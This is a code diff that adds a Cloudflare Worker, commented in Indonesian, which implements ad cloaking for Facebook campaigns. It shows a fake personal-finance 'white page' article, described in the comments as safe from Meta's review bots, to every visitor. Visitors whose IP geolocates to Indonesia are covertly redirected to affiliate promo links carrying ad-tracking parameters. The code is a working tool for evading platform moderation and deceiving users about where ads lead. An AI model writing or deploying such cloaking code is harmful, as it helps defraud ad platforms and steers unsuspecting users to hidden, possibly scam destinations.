@@ -1,0 +1,115 @@
+export default {
+  async fetch(request, env, ctx) {
+    // ==========================================
+    // 1. DAFTAR LINK TUJUAN PROMO ANDA (LINK B)
+    // ==========================================
+    const daftarLinkB = {
+      "/contoh": "https://google.com",
+"/promo0458": "https://top.vpnsakti.com/69b6724dcd3e43b57a6eeaa7?sub1={{ad.id}}&sub2={{adset.id}}&sub3={{campaign.id}}&sub4={{ad.name}}&sub5={{adset.name}}&sub6={{campaign.name}}&sub7={{placement}}&sub8={{site_source_name}}&utm_source=facebook&utm_medium=paid&sub15=1594&sub14=BER0458",
+"/promo1176": "https://top.vpnsakti.com/69b6724dcd3e43b57a6eeaa7?sub1={{ad.id}}&sub2={{adset.id}}&sub3={{campaign.id}}&sub4={{ad.name}}&sub5={{adset.name}}&sub6={{campaign.name}}&sub7={{placement}}&sub8={{site_source_name}}&utm_source=facebook&utm_medium=paid&sub15=1594&sub14=BER1176",
+};
+
+    const url = new URL(request.url);
+    const pathDiakses = url.pathname.toLowerCase(); 
+
+    // JIKA PATH TIDAK COCOK ATAU BUKA DOMAIN UTAMA (/) -> KUNCI DI BERANDA AMAN
+    if (!daftarLinkB[pathDiakses]) {
+      const berandaHTML = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Pusat Edukasi Finansial</title>
+            <style>
+                body { font-family: sans-serif; text-align: center; background: #f4f6f9; color: #333; padding-top: 100px; }
+                .box { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+                a { color: #0284c7; text-decoration: none; font-weight: bold; }
+            </style>
+        </head>
+        <body>
+            <div class="box">
+                <h2>Selamat Datang di FinTech Insights</h2>
+                <p>Silakan pelajari artikel keuangan dan manajemen investasi di portal kami secara gratis.</p>
+                <a href="https://apple.com">Jelajahi Artikel &raquo;</a>
+            </div>
+        </body>
+        </html>
+      `;
+      return new Response(berandaHTML, { headers: { "content-type": "text/html; charset=UTF-8" } });
+    }
+
+    // AMBIL LINK TARGET BERDASARKAN PROMO YANG DIKLIK
+    const targetLinkB = daftarLinkB[pathDiakses];
+
+    // DETEKSI IP NEGARA DI SISI SERVER CLOAKFIRE
+    const negaraIP = request.cf && request.cf.country ? request.cf.country.toUpperCase() : "US";
+
+    // KONTEN ARTIKEL UTAMA (WHITE PAGE) - STATUS TETAP HTTP 200 OK (Aman dari Bot Meta)
+    let hybridHTML = `
+      <!DOCTYPE html>
+      <html>
+      <head>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <title>FinTech Insights | Tips Mengelola Keuangan Modern</title>
+          <style>
+              body { font-family: sans-serif; background: #f8fafc; color: #333; padding: 20px; }
+              header { background: #0f172a; color: white; padding: 15px; text-align: center; font-weight: bold; margin-bottom: 20px; }
+              header a { color: #94a3b8; text-decoration: none; margin: 0 10px; font-size: 14px; }
+              .content { max-width: 600px; margin: 0 auto; background: white; padding: 25px; border-radius: 8px; border: 1px solid #e2e8f0; }
+              .menu-banyak { margin-top: 25px; padding-top: 15px; border-top: 1px solid #eee; }
+              .menu-banyak a { display: block; padding: 8px 0; color: #475569; text-decoration: none; font-size: 14px; }
+              .menu-banyak a:hover { color: #0284c7; }
+          </style>
+      </head>
+      <body>
+
+          <header>
+              FinTech Media | 
+              <a href="https://apple.com">Pasar</a>
+              <a href="https://apple.com">Edukasi</a>
+              <a href="https://apple.com">Forex</a>
+          </header>
+
+          <div class="content">
+              <h3>Cara Efektif Mengatur Portofolio Investasi Saham dan Forex</h3>
+              <p>Mengatur keuangan di era digital membutuhkan strategi yang matang. Salah satu cara terbaik untuk mengamankan aset dari inflasi adalah melakukan diversifikasi modal ke beberapa instrumen investasi, seperti reksadana, pasar saham, atau perdagangan mata uang asing (forex).</p>
+              <p>Penting untuk diingat agar selalu menggunakan dana dingin dan membatasi risiko kerugian (stop loss) setiap kali melakukan transaksi keuangan di pasar global.</p>
+              
+              <div class="menu-banyak">
+                  <h4>Rekomendasi Berita Lainnya:</h4>
+                  <a href="https://apple.com">1. Mengapa Suku Bunga Bank Sentral Naik?</a>
+                  <a href="https://apple.com">2. Tips Amankan Uang dari Investasi Bodong</a>
+                  <a href="https://apple.com">3. Panduan Dasar Belajar Analisis Teknikal</a>
+                  <a href="https://apple.com">4. Kebijakan Privasi & Layanan Konsumen</a>
+              </div>
+          </div>
+
+          <script type="text/javascript">
+              (function() {
+                  // Menerima data kode negara IP yang dikirimkan oleh server Cloudflare
+                  var userCountry = "KODE_NEGARA_SERVER";
+
+                  // JIKA KODE NEGARA ADALAH INDONESIA ("ID"), MAKA EKSEKUSI PENGALIHAN DI SISI KLIEN
+                  if (userCountry === "ID") {
+                      window.location.replace("ALAMAT_TARGET_DISINI");
+                  }
+              })();
+          </script>
+      </body>
+      </html>
+    `;
+
+    // PROSES SUBSTITUSI AMAN TANPA MERUSAK SINTAKSIS WORKER
+    hybridHTML = hybridHTML.replace("KODE_NEGARA_SERVER", negaraIP);
+    hybridHTML = hybridHTML.replace("ALAMAT_TARGET_DISINI", targetLinkB);
+
+    return new Response(hybridHTML, {
+      headers: { 
+        "content-type": "text/html; charset=UTF-8",
+        "cache-control": "no-store, no-cache, must-revalidate, max-age=0"
+      },
+    });
+  },
+};
